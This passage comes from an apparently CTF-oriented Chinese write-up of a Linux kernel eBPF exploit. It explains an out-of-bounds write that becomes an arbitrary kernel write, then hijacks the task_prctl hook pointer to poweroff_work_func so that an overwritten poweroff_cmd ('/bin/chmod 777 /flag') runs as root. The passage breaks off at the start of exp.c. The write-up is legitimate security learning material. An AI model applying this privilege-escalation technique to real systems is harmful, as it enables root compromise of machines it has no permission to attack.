@@ -1,0 +1,261 @@
+*)value+1`。因为是无符号数比较，我们利用越界写提前布置`array->map.max_entries=-1;map_type=BPF_MAP_TYPE_STACK`即可进行地址任意写。
+    static int map_update_elem(union bpf_attr *attr)
+    {
+        void __user *ukey = u64_to_user_ptr(attr->key);
+        void __user *uvalue = u64_to_user_ptr(attr->value);
+        int ufd = attr->map_fd;
+        struct bpf_map *map;
+        void *key, *value;
+        u32 value_size;
+        struct fd f;
+        int err;
+        if (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))
+            return -EINVAL;
+        f = fdget(ufd);
+        map = __bpf_map_get(f);
+        if (IS_ERR(map))
+            return PTR_ERR(map);
+        if (!(map_get_sys_perms(map, f) & FMODE_CAN_WRITE)) {
+            err = -EPERM;
+            goto err_put;
+        }
+        if ((attr->flags & BPF_F_LOCK) &&
+            !map_value_has_spin_lock(map)) {
+            err = -EINVAL;
+            goto err_put;
+        }
+        key = __bpf_copy_key(ukey, map->key_size);
+        if (IS_ERR(key)) {
+            err = PTR_ERR(key);
+            goto err_put;
+        }
+        if (map->map_type == BPF_MAP_TYPE_PERCPU_HASH ||
+            map->map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||
+            map->map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||
+            map->map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)
+            value_size = round_up(map->value_size, 8) * num_possible_cpus();
+        else
+            value_size = map->value_size;
+        err = -ENOMEM;
+        value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);
+        if (!value)
+            goto free_key;
+        err = -EFAULT;
+        if (copy_from_user(value, uvalue, value_size) != 0)
+            goto free_value;
+        err = bpf_map_update_value(map, f, key, value, attr->flags);//这里
+    free_value:
+        kfree(value);
+    free_key:
+        kfree(key);
+    err_put:
+        fdput(f);
+        return err;
+    }
+    //
+    static int bpf_map_update_value(struct bpf_map *map, struct fd f, void *key,
+                    void *value, __u64 flags)
+    {
+        int err;
+        /* Need to create a kthread, thus must support schedule */
+        if (bpf_map_is_dev_bound(map)) {
+            return bpf_map_offload_update_elem(map, key, value, flags);
+        } else if (map->map_type == BPF_MAP_TYPE_CPUMAP ||
+               map->map_type == BPF_MAP_TYPE_SOCKHASH ||
+               map->map_type == BPF_MAP_TYPE_SOCKMAP ||
+               map->map_type == BPF_MAP_TYPE_STRUCT_OPS) {
+            return map->ops->map_update_elem(map, key, value, flags);
+        } else if (IS_FD_PROG_ARRAY(map)) {
+            return bpf_fd_array_map_update_elem(map, f.file, key, value,
+                                flags);
+        }
+        bpf_disable_instrumentation();
+        if (map->map_type == BPF_MAP_TYPE_PERCPU_HASH ||
+            map->map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) {
+            err = bpf_percpu_hash_update(map, key, value, flags);
+        } else if (map->map_type == BPF_MAP_TYPE_PERCPU_ARRAY) {
+            err = bpf_percpu_array_update(map, key, value, flags);
+        } else if (map->map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) {
+            err = bpf_percpu_cgroup_storage_update(map, key, value,
+                                   flags);
+        } else if (IS_FD_ARRAY(map)) {
+            rcu_read_lock();
+            err = bpf_fd_array_map_update_elem(map, f.file, key, value,
+                               flags);
+            rcu_read_unlock();
+        } else if (map->map_type == BPF_MAP_TYPE_HASH_OF_MAPS) {
+            rcu_read_lock();
+            err = bpf_fd_htab_map_update_elem(map, f.file, key, value,
+                              flags);
+            rcu_read_unlock();
+        } else if (map->map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) {
+            /* rcu_read_lock() is not needed */
+            err = bpf_fd_reuseport_array_update_elem(map, key, value,
+                                 flags);
+        } else if (map->map_type == BPF_MAP_TYPE_QUEUE ||
+               map->map_type == BPF_MAP_TYPE_STACK) {
+            err = map->ops->map_push_elem(map, value, flags);//这里
+        } else {
+            rcu_read_lock();
+            err = map->ops->map_update_elem(map, key, value, flags);
+            rcu_read_unlock();
+        }
+        bpf_enable_instrumentation();
+        maybe_wait_bpf_programs(map);
+        return err;
+    }
+    /* Called from syscall */
+    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)
+    {
+        struct bpf_array *array = container_of(map, struct bpf_array, map);
+        u32 index = key ? *(u32 *)key : U32_MAX;
+        u32 *next = (u32 *)next_key;
+        if (index >= array->map.max_entries) {
+            *next = 0;
+            return 0;
+        }
+        if (index == array->map.max_entries - 1)
+            return -ENOENT;
+        *next = index + 1;
+        return 0;
+    }
+### 控制流劫持
+原本想劫持modprobe_path来进行任意命令执行，不过搜索之后未能发现，因此换成prctl函数劫持控制流的方式。我们在sys.c里可以看到`prctl`系统调用的实现，内部调用了`security_task_prctl`。在security.c中可以看到其函数实现，核心是调用`hp->hook.task_prctl(option,
+arg2, arg3, arg4,
+arg5);`这个函数指针我们可以写个prctl调用的demo调试看到，其位置为`0xffffffff824b3f88+0x18`。因为这里是可写的data段，我们可以讲其改成任意的函数指针并在调用prctl时触发控制流劫持。
+    data:FFFFFFFF824B3D80 capability_hooks security_hook_list , \
+    .data:FFFFFFFF824B3D80                                     offset security_hook_heads_0.capable-7D4679C0h, , 0>
+    .data:FFFFFFFF824B3D80                 security_hook_list , \
+    .data:FFFFFFFF824B3D80                                     offset security_hook_heads_0.settime-7D4679A0h, , 0>
+    .data:FFFFFFFF824B3D80                 security_hook_list , \
+    .data:FFFFFFFF824B3D80                                     offset security_hook_heads_0.ptrace_access_check-7D4679E0h,\
+    .data:FFFFFFFF824B3D80                                     , 0>
+    .data:FFFFFFFF824B3D80                 security_hook_list , \
+    .data:FFFFFFFF824B3D80                                     offset security_hook_heads_0.ptrace_traceme-7D4679D8h,\
+    .data:FFFFFFFF824B3D80                                     , 0>
+    SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
+            unsigned long, arg4, unsigned long, arg5)
+    {
+        struct task_struct *me = current;
+        unsigned char comm[sizeof(me->comm)];
+        long error;
+        error = security_task_prctl(option, arg2, arg3, arg4, arg5);
+        if (error != -ENOSYS)
+            return error;
+        error = 0;
+        //...
+    }
+    //
+    int security_task_prctl(int option, unsigned long arg2, unsigned long arg3,
+                 unsigned long arg4, unsigned long arg5)
+    {
+        int thisrc;
+        int rc = LSM_RET_DEFAULT(task_prctl);
+        struct security_hook_list *hp;
+        hlist_for_each_entry(hp, &security_hook_heads.task_prctl, list) {
+            thisrc = hp->hook.task_prctl(option, arg2, arg3, arg4, arg5);
+            if (thisrc != LSM_RET_DEFAULT(task_prctl)) {
+                rc = thisrc;
+                if (thisrc != 0)
+                    break;
+            }
+        }
+        return rc;
+    }
+函数的第一个option是一个32位的变量，因此我们在64位下不可控，我们选择劫持其为`poweroff_work_func`函数地址，并将`poweroff_cmd`改为要执行的命令。
+这条攻击链如下,`poweroff_work_func->run_cmd(poweroff_cmd)->call_usermodehelper(argv[0],
+argv, envp, UMH_WAIT_EXEC)->call_usermodehelper_exec(info,
+wait)`。最终可以以root权限启动一个用户态的程序。
+我们这里选择将`poweroff_cmd`覆写为`/bin/chmod 777 /flag`，之后用户态下查看即可
+    static void poweroff_work_func(struct work_struct *work)
+    {
+        __orderly_poweroff(poweroff_force);
+    }
+    //
+    static int __orderly_poweroff(bool force)
+    {
+        int ret;
+        ret = run_cmd(poweroff_cmd);//这里
+        if (ret && force) {
+            pr_warn("Failed to start orderly shutdown: forcing the issue\n");
+            /*
+             * I guess this should try to kick off some daemon to sync and
+             * poweroff asap.  Or not even bother syncing if we're doing an
+             * emergency shutdown?
+             */
+            emergency_sync();
+            kernel_power_off();
+        }
+        return ret;
+    }
+    //
+    char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
+    static const char reboot_cmd[] = "/sbin/reboot";
+    static int run_cmd(const char *cmd)
+    {
+        char **argv;
+        static char *envp[] = {
+            "HOME=/",
+            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+            NULL
+        };
+        int ret;
+        argv = argv_split(GFP_KERNEL, cmd, NULL);
+        if (argv) {
+            ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);//这里
+            argv_free(argv);
+        } else {
+            ret = -ENOMEM;
+        }
+        return ret;
+    }
+    /**
+     * call_usermodehelper() - prepare and start a usermode application
+     * @path: path to usermode executable
+     * @argv: arg vector for process
+     * @envp: environment for process
+     * @wait: wait for the application to finish and return status.
+     *        when UMH_NO_WAIT don't wait at all, but you get no useful error back
+     *        when the program couldn't be exec'ed. This makes it safe to call
+     *        from interrupt context.
+     *
+     * This function is the equivalent to use call_usermodehelper_setup() and
+     * call_usermodehelper_exec().
+     */
+    int call_usermodehelper(const char *path, char **argv, char **envp, int wait)
+    {
+        struct subprocess_info *info;
+        gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;
+        info = call_usermodehelper_setup(path, argv, envp, gfp_mask,
+                         NULL, NULL, NULL);
+        if (info == NULL)
+            return -ENOMEM;
+        return call_usermodehelper_exec(info, wait);
+    }
+## exp.c
+题目给的vmlinux是无符号的，调试起来非常费劲，因此我拿源码自己编译了一个带符号的，这样可以源码调试，因为编译的问题有一些函数会内联进去，IDA中搜符号搜不到，调试的时候如果搜不到，可以找上层调用函数，再自己去定位。
+    #define _GNU_SOURCE
+    #include        
+    #include       
+    #include       
+    #include        
+    #include       
+    #include       
+    #include    
+    #include  
+    #include   
+    #include        
+    #include   
+    #include "linux/bpf.h"   
+    #include "bpf_insn.h"    
+    #define LOG_BUF_SIZE 65535
+    #define BPF_MAP_GET(idx, dst)                                                        \
+        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
+        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
+        BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
+        BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
+        BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */
+    #define BPF_MAP_GET_ADDR(idx, dst)                                                        \
